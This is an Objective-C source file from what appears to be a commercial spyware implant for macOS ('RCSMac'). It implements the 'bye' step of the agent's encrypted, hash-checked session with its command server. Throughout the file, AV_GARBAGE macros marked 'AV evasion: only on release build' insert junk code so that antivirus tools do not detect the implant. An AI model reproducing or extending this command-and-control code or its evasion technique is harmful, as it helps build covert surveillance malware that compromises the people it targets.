/*
 * RCSMac - Bye Network Operation
 *
 *
 * Created by revenge on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */
#import "RCSMCommon.h"

#import "ByeNetworkOperation.h"
#import "NSMutableData+AES128.h"
#import "NSMutableData+SHA1.h"
#import "NSData+SHA1.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

@implementation ByeNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
    {
      mTransport  = aTransport;
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      return self;
    }
  
  return nil;
}

- (BOOL)perform
{  
  // AV evasion: only on release build
  AV_GARBAGE_004  
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  BOOL success = NO;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  uint32_t command = PROTO_BYE;
  NSMutableData *commandData = [[NSMutableData alloc] initWithBytes: &command
                                                             length: sizeof(uint32_t)];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSData *commandSha = [commandData sha1Hash];
  [commandData appendData: commandSha];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  [commandData encryptWithKey: gSessionKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if (replyData == nil)
    {  
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      return NO;
    }

  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  [replyDecrypted decryptWithKey: gSessionKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  uint32_t protoCommand;
  @try
    {  
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      [replyDecrypted getBytes: &protoCommand
                         range: NSMakeRange(0, sizeof(int))];
    }
  @catch (NSException *e)
    {  
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      return NO;
    }
  
  // remove padding
  [replyDecrypted removePadding];
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  @try
    {
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
      
      // AV evasion: only on release build
      AV_GARBAGE_009
      
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
    }
  @catch (NSException *e)
    {  
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      [replyDecrypted release];  
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  shaLocal = [shaLocal sha1Hash];
  
  // AV evasion: only on release build
  AV_GARBAGE_009  
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {  
      // AV evasion: only on release build
      AV_GARBAGE_008
    
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      return NO;
    }
  
  if (protoCommand == PROTO_OK)
    {  
      // AV evasion: only on release build
      AV_GARBAGE_006
    
      success = YES;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  [commandData release];
  [replyDecrypted release];  
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  return success;
}

@end
